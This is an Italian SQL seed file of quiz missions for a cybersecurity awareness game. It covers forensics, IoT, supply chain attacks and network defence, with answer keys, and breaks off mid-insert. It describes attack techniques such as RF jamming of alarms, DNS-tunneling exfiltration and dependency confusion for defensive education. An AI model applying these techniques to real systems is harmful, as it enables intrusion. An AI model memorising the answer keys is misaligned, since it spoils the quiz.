-- Mission Seed for Campania (Theme: "Il Golfo dei Pirati: Inganno e Strategia Avanzata")
-- Region: Campania (Boss Finale: NAPOLI)
-- Provinces: Benevento (BN), Avellino (AV), Caserta (CE), Salerno (SA), Napoli (NA)

-- =================================================================================================
-- BENEVENTO (BN) - Forensics & Tracce Digitali ("Le Streghe Digitali")
-- =================================================================================================

-- Mission 1: Metadata Forensics - Facile
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000001', 'BN', 'Fantasmi nel File',
    'Ciò che cancelli resta scritto.',
    E'# Metadati\n\nQuando invii un documento Word o una foto, non invii solo il testo o l''immagine.\nInvii anche:\n*   Nome dell''autore\n*   Data di creazione e ultima modifica\n*   Modello della fotocamera e coordinate GPS\n*   Tempo totale di editing\n\nI "Whistleblower" vengono spesso scoperti perché dimenticano di pulire questi dati.',
    'semplice', '5 min', 50, 'level_1', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000001', 'Hai oscurato un nome in un PDF con lo strumento "Evidenziatore Nero". È sicuro?', 'multiple_choice', '["Sì, è nero", "No. Spesso il testo sotto rimane selezionabile e copiabile. Devi usare strumenti di ''Redaction'' o appiattire il PDF come immagine", "Sì, se lo stampi", "Dipende dal colore"]', 1, 'Errore classico di molti studi legali e governi. Il layer nero è solo "sopra" il testo, non lo cancella.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000001', 'Cosa rivelano i dati EXIF di una foto scattata col cellulare?', 'multiple_choice', '["Il tuo umore", "La posizione GPS esatta di casa tua, l''ora precisa e il modello di telefono", "Il numero di telefono", "Nulla"]', 1, 'Mai pubblicare foto online senza aver strippato gli EXIF, se ci tieni alla privacy.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000001', 'Copiare il testo in un nuovo file TXT cancella i metadati originali?', 'multiple_choice', '["No", "Sì, il formato TXT non supporta metadati complessi come Autore o GPS. È un buon metodo di pulizia rapida", "Solo se rinomini il file", "Forse"]', 1, 'Il "Plain Text" è il formato più igienico.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000001', 'Windows mostra tutti i metadati nelle "Proprietà" del file.', 'true_false', '["Vero", "Falso"]', 0, 'Mostra i principali, ma esistono stream di dati alternativi (ADS) o metadati specifici dell''applicazione che Windows non mostra.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000001', 'Questa immagine oscurata è sicura?', 'image_true_false', '["Vero", "Falso"]', 0, 'Se usi la "Sfocatura" o la "Pixelizzazione" invece di una banda solida, l''AI moderna (Deblur) può spesso ricostruire il testo originale.', 'https://placehold.co/600x400?text=Pixelated+Password');


-- Mission 2: Time Stomping - Medio
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000002', 'BN', 'La Macchina del Tempo',
    'La data di modifica mente.',
    E'# Time Stomping\n\nCome fa un hacker a nascondere un virus in una cartella di sistema dove tutti i file sono del 2019?\nCambia la data del virus!\n\nCon strumenti banali, le date "Creazione", "Modifica" e "Accesso" possono essere falsificate per sembrare coerenti con il resto del sistema. Non fidarti mai dell''ordine cronologico.',
    'medio', '10 min', 75, 'level_2', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000002', 'Se un file dice "Ultima modifica: 1990", è sicuramente vecchio?', 'multiple_choice', '["Sì", "No, è palesemente alterato (o un errore di sistema), ma dimostra che il timestamp non è una prova di autenticità", "Dipende dal fuso orario", "Sì, Windows 95"]', 1, 'In forensica, il timestamp è il dato più volatile e manipolabile.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000002', 'Come si scopre il vero orario di creazione di un file manipolato?', 'multiple_choice', '["Non si può", "Analizzando la $MFT (Master File Table) del filesystem NTFS, che mantiene attributi più difficili da alterare rispetto a quelli mostrati dall''interfaccia", "Chiedendo a Microsoft", "Guardando l''ora del BIOS"]', 1, '$STANDARD_INFORMATION vs $FILE_NAME attributes.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000002', 'Un file ZIP conserva le date originali dei file dentro?', 'multiple_choice', '["Sì", "Spesso sì, quindi zippare e unzippare può preservare il timestamp originale anche se lo sposti", "No, le resetta a oggi", "A volte"]', 1, 'Utile per mantenere la catena di custodia informale.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000002', 'Aprire un file solo per leggerlo cambia il suo Hash (impronta digitale)?', 'true_false', '["Vero", "Falso"]', 1, 'Falso! Cambia solo l''"Ultimo Accesso". L''Hash cambia solo se modifichi il CONTENUTO (anche di un bit).', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000002', 'Questo file di sistema `kernel32.dll` creato "Ieri" è sospetto?', 'image_true_false', '["Vero", "Falso"]', 0, 'Sì! I file di sistema dovrebbero avere date coerenti con gli aggiornamenti di Windows, non date recenti casuali.', 'https://placehold.co/600x400?text=System+File+Date+Yesterday');


-- Mission 3: Steganografia - Difficile
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000003', 'BN', 'Nascosto in Piena Vista',
    'Un''immagine vale mille... password.',
    E'# Steganografia\n\nÈ l''arte di nascondere un messaggio DENTRO un altro media.\n\nEsempio: Prendo una foto di un gatto. Modifico impercettibilmente il colore di alcuni pixel (LSB - Least Significant Bit).\nAll''occhio umano è sempre un gatto.\nPer un software, quei pixel formano un file EXE malevolo o un messaggio segreto.',
    'difficile', '15 min', 150, 'level_3', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000003', 'Qual è la differenza tra Crittografia e Steganografia?', 'multiple_choice', '["Nessuna", "La Crittografia rende il messaggio illeggibile ma palese (si vede che è segreto). La Steganografia nasconde l''ESISTENZA stessa del segreto", "La Steganografia è più debole", "La Crittografia usa le chiavi"]', 1, 'L''obiettivo della steganografia è non destare sospetti.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000003', 'Perché gli antivirus faticano a trovare codice malevolo steganografato nelle immagini?', 'multiple_choice', '["Sono pigri", "Perché l''immagine è sintatticamente valida. Il payload malevolo viene estratto ed eseguito solo da un altro programma già infetto (Loader)", "Perché le immagini sono grandi", "Perché amano i gatti"]', 1, 'L''immagine in sé è inerte. Serve un "attivatore".', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000003', 'Modificare una foto (es. crop o ridimensiona) distrugge il messaggio steganografico nascosto nei bit?', 'multiple_choice', '["Sì, quasi sempre", "No, resiste a tutto", "Dipende dal formato", "Solo se diventa bianco e nero"]', 0, 'La steganografia LSB è fragile. Metodi più avanzati (nel dominio della frequenza DCT) sono più resistenti.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000003', 'Si può nascondere un file ZIP dentro un file JPG semplicemente incollandoli?', 'true_false', '["Vero", "Falso"]', 0, 'Vero ("Polyglot file"). Il visualizzatore legge l''header JPG e si ferma alla fine dell''immagine. Il software ZIP legge l''header ZIP che è in coda. Funziona!', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000003', 'Riesci a vedere la differenza tra queste due immagini?', 'image_true_false', '["Vero", "Falso"]', 1, 'No, la differenza è nei bit invisibili. Senza analisi statistica (steganalisi) è impossibile a occhio nudo.', 'https://placehold.co/600x400?text=Stego+Comparison');


-- =================================================================================================
-- AVELLINO (AV) - IoT & Smart Home ("Il Lupo nella rete")
-- =================================================================================================

-- Mission 1: La Lampadina Spia - Facile
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000004', 'AV', 'La Lampadina Spia',
    'Un oggetto da 5 euro conosce la tua password da 50 caratteri.',
    E'# IoT Security\n\nPer connettersi al Wi-Fi, la tua lampadina Smart deve conoscere la password della rete.\nDove la salva?\nSpesso in un chip di memoria non protetto all''interno della lampadina stessa.\n\nSe butti la lampadina rotta nella spazzatura, qualcuno può aprirla, leggere il chip (dump firmware) e ottenere la tua password del Wi-Fi.',
    'semplice', '5 min', 50, 'level_1', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000004', 'Come mitigare il rischio di dispositivi IoT insicuri?', 'multiple_choice', '["Non usarli", "Creare una rete ''Guest'' o ''IoT'' separata (VLAN) isolata dalla rete principale dove tieni i PC e i dati", "Spegnere la luce", "Usare lampadine costose"]', 1, 'La segmentazione della rete è la difesa chiave.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000004', 'Se un attaccante controlla la tua lampadina Smart, cosa può fare?', 'multiple_choice', '["Solo cambiare colore", "Usarla come ponte (Pivot) per attaccare il resto della tua rete interna, scansionare il tuo PC o lanciare attacchi DDoS", "Bruciarla", "Nulla"]', 1, 'Un computer è un computer, anche se è a forma di lampadina.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000004', 'Universal Plug and Play (UPnP) è sicuro per le telecamere IP?', 'multiple_choice', '["Sì, è comodo", "No! Permette alla telecamera di aprire porte sul router automaticamente, esponendosi a tutto Internet senza che tu lo sappia", "Solo se Sony", "Dipende"]', 1, 'UPnP è la causa principale delle telecamere spiate su Shodan.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000004', 'Le Smart TV ascoltano quello che dici?', 'true_false', '["Vero", "Falso"]', 0, 'Molte hanno il riconoscimento vocale sempre attivo e inviano campioni ai server del produttore per "migliorare il servizio".', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000004', 'Questa porta aperta su Internet (Port 554 RTSP) è un problema?', 'image_true_false', '["Vero", "Falso"]', 0, 'Sì! RTSP è il protocollo di streaming video. Se non ha password, chiunque vede dentro casa tua.', 'https://placehold.co/600x400?text=Open+RTSP+Port');


-- Mission 2: Botnet (Mirai) - Medio
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000005', 'AV', 'L''Esercito di Zombie',
    'I tuoi elettrodomestici sono in guerra.',
    E'# Botnet Mirai\n\nNel 2016, Internet si è quasi fermato.\nMilioni di telecamere e DVR (registratori video) economici avevano una password di default (`admin/admin`) impossibile da cambiare o sconosciuta agli utenti.\n\nIl malware Mirai le ha infettate tutte automaticamente, usandole insieme per lanciare un attacco colossale contro i server DNS.',
    'medio', '10 min', 75, 'level_2', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000005', 'Qual è il sintomo principale se il tuo frigo Smart è in una Botnet?', 'multiple_choice', '["Il cibo scade", "Internet è lento (tutta la banda in upload è usata per attaccare altri), ma il frigo funziona normalmente", "Lo schermo diventa rosso", "Fa rumore"]', 1, 'Le Botnet vogliono restare invisibili al proprietario per durare a lungo.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000005', 'Perché i produttori lasciano credenziali di default hardcoded (es. backdoor)?', 'multiple_choice', '["Per cattiveria", "Per debugging e assistenza remota, o pura negligenza nello sviluppo del firmware", "Per legge", "Per errore"]', 1, 'Spesso è codice dimenticato dagli sviluppatori.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000005', 'Riavviare il router o la telecamera rimuove il malware Mirai?', 'multiple_choice', '["No", "Sì, perché Mirai risiede in RAM (memoria volatile). MA si reinfetterà in pochi minuti se non cambi la password o aggiorni il firmware", "Sì per sempre", "Dipende"]', 1, 'Essendo "fileless" (solo in memoria), il riavvio lo uccide. Ma la porta aperta lo fa rientrare.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000005', 'Shodan è un motore di ricerca per siti web.', 'true_false', '["Vero", "Falso"]', 1, 'Falso. Shodan è un motore di ricerca per DISPOSITIVI commessi a Internet (IoT, Server, Cam, Semafori).', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000005', 'Questa mappa di attacchi DDoS mostra traffico normale?', 'image_true_false', '["Vero", "Falso"]', 1, 'No, picchi di traffico simultaneo da tutto il mondo verso un punto indicano una Botnet in azione.', 'https://placehold.co/600x400?text=DDoS+Attack+Map');


-- Mission 3: Zigbee & Jamming - Difficile
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000006', 'AV', 'Silenzio Radio',
    'Se l''allarme non può urlare, non c''è nessun ladro.',
    E'# RF Jamming\n\nMolti allarmi casa "fai da te" usano frequenze radio standard (433MHz, 868MHz, Wi-Fi, Zigbee) per comunicare tra sensori e centralina.\n\nUn ladro con un **Jammer** (disturbatore di frequenza) da pochi euro può inondare l''aria di rumore bianco.\nLa centralina non sente più il sensore della finestra che si apre. L''allarme non suona.',
    'difficile', '15 min', 150, 'level_3', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000006', 'Qual è la difesa contro il Jamming?', 'multiple_choice', '["Urlare forte", "Usare sistemi con ''Rilevamento Jamming'' (Anti-masking) che scattano se la frequenza è disturbata, o meglio ancora, sensori CABLATI", "Cambiare batterie", "Usare il 5G"]', 1, 'Il cavo è l''unica garanzia contro le interferenze radio.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000006', 'Il protocollo Zigbee (Philips Hue, Ikea) è cifrato?', 'multiple_choice', '["No", "Sì, ma durante l''accoppiamento (Pairing) iniziale la chiave di rete può essere sniffata se l''hacker è vicino (entro pochi metri)", "Sì, inviolabile", "Solo su prodotti costosi"]', 1, 'Il momento del "Pairing" è il più vulnerabile.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000006', 'Uno Smart Lock (serratura) che si apre con l''App è più sicuro della chiave fisica?', 'multiple_choice', '["Sì, sempre", "No. Aggiunge una superficie di attacco digitale (Bluetooth/Wi-Fi) a quella fisica. Se la batteria muore o il server va down, potresti restare fuori", "Uguale", "Dipende dalla porta"]', 1, 'Spesso la comodità riduce la sicurezza (Availability risk).', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000006', 'Un attacco "Replay" contro il cancello elettrico funziona sempre.', 'true_false', '["Vero", "Falso"]', 1, 'Falso. I telecomandi moderni usano "Rolling Codes" (il codice cambia a ogni pressata). Il Replay funziona solo su vecchi sistemi a codice fisso.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000006', 'Questo spettrogramma mostra un segnale pulito?', 'image_true_false', '["Vero", "Falso"]', 1, 'No, tutto quel "rumore" rosso continuo indica un Jamming attivo sulla frequenza.', 'https://placehold.co/600x400?text=RF+Spectrum+Jamming');


-- =================================================================================================
-- CASERTA (CE) - Supply Chain & Zero Trust ("La Reggia Violata")
-- =================================================================================================

-- Mission 1: Il Fornitore Fidato - Facile
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000007', 'CE', 'L''Anello Debole',
    'Ti senti sicuro? E il tuo idraulico?',
    E'# Supply Chain Attack\n\nLe grandi aziende (e le grandi "Regge") sono difficili da attaccare direttamente.\nGli hacker attaccano i fornitori più piccoli (manutenzione, climatizzazione, pulizie) che hanno accessi privilegiati alla rete del target.\n\nEsempio storico: Target (USA) è stata hackerata tramite le credenziali del fornitore dei condizionatori d''aria.',
    'semplice', '5 min', 50, 'level_1', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000007', 'Perché dare accesso "Admin" a un fornitore esterno è sbagliato?', 'multiple_choice', '["Costano troppo", "Viola il principio del minimo privilegio (Least Privilege). Se il fornitore viene bucato, l''hacker diventa Admin da te", "Non sanno usare il PC", "Per gelosia"]', 1, 'Dai solo l''accesso necessario, per il tempo necessario.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000007', 'Cos''è l''Island Hopping (Salto dell''isola)?', 'multiple_choice', '["Una vacanza", "Attaccare una rete piccola e poco protetta per usarla come trampolino verso la rete dell''obiettivo primario", "Un gioco", "Un virus"]', 1, 'Strategia militare applicata al cyber.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000007', 'Un software Open Source è automaticamente sicuro perché "tutti lo controllano"?', 'multiple_choice', '["Sì, legge di Linus", "No. Molti progetti sono mantenuti da una sola persona stanca. Bug critici (es. Heartbleed) possono restare invisibili per anni", "Sì, sempre", "Solo se Linux"]', 1, 'Molti occhi fanno i bug superficiali. Ma pochi guardano davvero il codice profondo.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000007', 'Le estensioni del browser sono una forma di Supply Chain?', 'true_false', '["Vero", "Falso"]', 0, 'Sì. Se lo sviluppatore vende l''estensione a un''azienda di adware, l''aggiornamento automatico infetta tutti gli utenti.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000007', 'Questa schermata di login di terze parti è fidata?', 'image_true_false', '["Vero", "Falso"]', 1, 'Se il dominio dell''URL non corrisponde al servizio (es. auth-provider-xyz.com invece di google.com), è phishing.', 'https://placehold.co/600x400?text=Fake+Third+Party+Login');


-- Mission 2: Typosquatting (Punycode) - Medio
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000008', 'CE', 'Il Gemello Diverso',
    'Sembra Apple, ma è ananas.',
    E'# Punycode & IDN Homograph\n\nI nomi di dominio internazionali (IDN) permettono caratteri non latini.\nL''indirizzo `xn--pple-43d.com` viene visualizzato dai vecchi browser come `аpple.com`.\n\nSembra uguale? La "a" è un carattere cirillico.\nQuesto attacco rende il Phishing visivamente perfetto.',
    'medio', '10 min', 75, 'level_2', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000008', 'Come difendersi dagli attacchi Homograph?', 'multiple_choice', '["Imparare il russo", "Usare un Password Manager (che non autofcompila se il dominio non corrisponde esattamente) e guardare il certificato SSL che rivela il vero ''Common Name''", "Non usare internet", "Usare Bing"]', 1, 'Il Password Manager non si fa ingannare dalla grafica.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000008', 'Registrare `goggle.com` è illegale?', 'multiple_choice', '["Sì, sempre", "È una zona grigia (Cybersquatting), ma spesso viene fatto per monetizzare errori di battitura o distribuire malware", "No, è libero mercato", "Solo in America"]', 1, 'Google possiede goggle.com proprio per evitare che lo usino altri.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000008', 'Cosa significa TLD?', 'multiple_choice', '["Too Long Didn''t read", "Top Level Domain (.com, .it, .gov). Attenzione ai nuovi TLD insoliti (es. .zip, .bank) usati per inganni", "Total Loss Data", "Tempo Libero"]', 1, 'Il dominio `.zip` di Google ha creato polemiche perché confonde i nomi dei file con i siti web.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000008', 'Un link accorciato (bit.ly) è sicuro se ha il lucchetto HTTPS.', 'true_false', '["Vero", "Falso"]', 1, 'Falso. Il lucchetto è per bit.ly, non sai dove ti porta dopo il redirect.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000008', 'Questo URL "paypaI.com" (con la i maiuscola) è valido?', 'image_true_false', '["Vero", "Falso"]', 0, 'La "I" maiuscola sembra una "l" (elle) in molti font. È un classico trucco. PayPal si scrive con la L.', 'https://placehold.co/600x400?text=Homograph+Example');


-- Mission 3: Dependency Confusion - Difficile
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000009', 'CE', 'Librerie Miste',
    'Quando il gestore pacchetti sbaglia strada.',
    E'# Dependency Confusion\n\nLa tua azienda usa una libreria privata interna chiamata `my-core-utils`.\nUn hacker vede questo nome nel tuo codice JavaScript pubblico (es. `package.json`).\n\nL''hacker pubblica una libreria col nome UGUALE `my-core-utils` su NPM pubblico, ma con versione `99.0.0`.\nIl tuo sistema di build, vedendo una versione più nuova, scarica quella dell''hacker invece della tua interna.\nBoom.',
    'difficile', '15 min', 150, 'level_3', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000009', 'Come si previene la Dependency Confusion?', 'multiple_choice', '["Sperando", "Configurando il gestore pacchetti (npm/pip) per usare ''Scope'' privati (@mycompany/utils) e bloccando l''accesso al registro pubblico per i nomi interni", "Cambiando nomi ogni giorno", "Usando C++"]', 1, 'Usare namespace privati (@scope) è la soluzione architetturale corretta.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000009', 'Cos''è l''attacco SolarWinds?', 'multiple_choice', '["Vento solare", "Il più famoso Supply Chain attack della storia, dove gli hacker hanno inserito codice malevolo nell''aggiornamento ufficiale del software Orion, distribuito a migliaia di aziende e governi", "Un pannello rotto", "Un film"]', 1, 'Hanno avvelenato la sorgente (Source Code Compromise).', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000009', 'Analizzare il codice statico (SAST) trova uan backdoor nella dipendenza?', 'multiple_choice', '["Sì, sempre", "Spesso no, se la dipendenza viene scaricata dinamicamente o è offuscata. Serve l''analisi della composizione software (SCA)", "No, SAST è inutile", "Solo se è Python"]', 1, 'SCA (Software Composition Analysis) serve proprio a mappare i rischi nelle terze parti.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000009', 'Bloccare i file `.exe` nelle email ferma tutti i virus?', 'true_false', '["Vero", "Falso"]', 1, 'Falso. I virus arrivano via script, macro Office, link, o fileless.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000009', 'Il lucchetto "Verified" su NPM/GitHub garantisce che il codice sia buono?', 'image_true_false', '["Vero", "Falso"]', 1, 'Garantisce solo l''identità dell''autore, non le sue intenzioni o se è stato hackerato.', 'https://placehold.co/600x400?text=Verified+Badge+Trap');


-- =================================================================================================
-- SALERNO (SA) - Network Defense ("La Scuola Medica")
-- =================================================================================================

-- Mission 1: Port Scanning - Facile
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000010', 'SA', 'Bussare alle Porte',
    'Se qualcuno bussa, tu rispondi?',
    E'# Porte Aperte\n\nOgni servizio (Web, Mail, Gioco) ascolta su una "Porta" numerica.\nUn Port Scan (es. Nmap) bussa a tutte le porte per vedere chi risponde.\n\n*   **Aperta:** "Ciao, sono un Server Web v2.0".\n*   **Chiusa (Closed):** "Vattene, qui non c''è nulla" (Rivelando che il PC esiste).\n*   **Stealth (Dropped/Filtered):** Silenzio assoluto. (La scelta migliore).',
    'semplice', '5 min', 50, 'level_1', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000010', 'Qual è la differenza tra REJECT e DROP nel firewall?', 'multiple_choice', '["Nessuna", "REJECT invia una risposta ''Accesso Negato'' (educato ma visibile). DROP butta il pacchetto nel vuoto senza rispondere (invisibile)", "DROP è più lento", "REJECT è rosso"]', 1, 'Per la security, DROP è quasi sempre preferibile per rallentare gli scan.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000010', 'Perché cambiare la porta SSH da 22 a 2222 è sicurezza debole?', 'multiple_choice', '["Non è debole", "È ''Security by Obscurity''. Uno scanner trova la porta aperta in pochi secondi comunque. Meglio usare le chiavi SSH invece delle password", "Cambia il protocollo", "Non funziona"]', 1, 'Riduce il rumore dei bot stupidi nei log, ma non ferma un hacker vero.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000010', 'Cos''è l''UPnP sul router di casa?', 'multiple_choice', '["Un protocollo che apre le porte automaticamente su richiesta delle App (es. console giochi). Comodo ma pericoloso se un malware lo usa per esporre il PC", "Un nuovo Wi-Fi", "Un antivirus", "Powerline"]', 0, 'Da disabilitare sempre se si vuole il controllo.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000010', 'Il NAT (condividere un IP pubblico) è un firewall?', 'true_false', '["Vero", "Falso"]', 1, 'È un mito comune. Il NAT nasconde gli IP interni, ma non ispeziona il traffico. Senza firewall stateful, alcune minacce passano (es. hole punching).', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000010', 'Questo risultato di Nmap significa che il server è sicuro?', 'image_true_false', '["Vero", "Falso"]', 1, 'Vedere molte porte "Open" con versioni vecchie software è il contrario della sicurezza. È un invito a nozze.', 'https://placehold.co/600x400?text=Nmap+Scan+Result');


-- Mission 2: DNS Over HTTPS (DoH) - Medio
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000011', 'SA', 'Il Tunnel Cieco',
    'Proteggere la privacy o perdere il controllo?',
    E'# DNS Over HTTPS (DoH)\n\nTradizionalmente, le richieste DNS (che sito vuoi visitare?) sono in chiaro.\nIl DoH le cifra dentro il traffico HTTPS.\n\n*   **Pro:** Il provider/stato non vede cosa visiti.\n*   **Contro (Aziendale):** Il firewall aziendale NON vede più se stai visitando un sito malware e non può bloccarlo. L''hacker può usare il DNS per esfiltrare dati (DNS Tunneling) senza essere visto.',
    'medio', '10 min', 75, 'level_2', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000011', 'Perché un CISO aziendale potrebbe voler bloccare il DoH?', 'multiple_choice', '["Odia la privacy", "Perché il DoH bypassa i filtri di sicurezza DNS aziendali e rende invisibile il traffico ai sistemi di monitoraggio", "Per risparmiare banda", "Perché è lento"]', 1, 'È il classico trade-off tra Privacy Utente e Sicurezza Aziendale.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000011', 'Cos''è il DNS Tunneling?', 'multiple_choice', '["Scavare una buca", "Codificare dati segreti dentro finte richieste DNS (es. `password.hacker.com`). Passa attraverso i firewall perché il DNS è sempre permesso", "Usare una VPN", "Cambiare DNS"]', 1, 'Tecnica lenta ma efficacissima per rubare dati da reti isolate.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000011', 'Usare 8.8.8.8 (Google DNS) ti rende anonimo a Google?', 'multiple_choice', '["Sì", "No, stai dicendo a Google ogni sito che visiti. Ti rende anonimo al tuo Provider Internet (ISP), ma sposti la fiducia su Google", "Forse", "Sì se usi Chrome"]', 1, 'Non esiste "nessuno sa". Qualcuno risolve sempre il nome.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000011', 'HTTPS cifra anche l''indirizzo IP di destinazione?', 'true_false', '["Vero", "Falso"]', 1, 'Impossibile. I router devono sapere l''IP per consegnare il pacchetto. L''IP è sempre visibile.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000011', 'Se il browser usa "Secure DNS", chi vede le tue richieste?', 'image_true_false', '["Vero", "Falso"]', 0, 'Solo il provider DoH scelto (es. Cloudflare) e tu. Non l''ISP locale.', 'https://placehold.co/600x400?text=Browser+Secure+DNS');


-- Mission 3: Honeypot - Difficile
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000012', 'SA', 'Il Vaso di Miele',
    'Trappole per orsi digitali.',
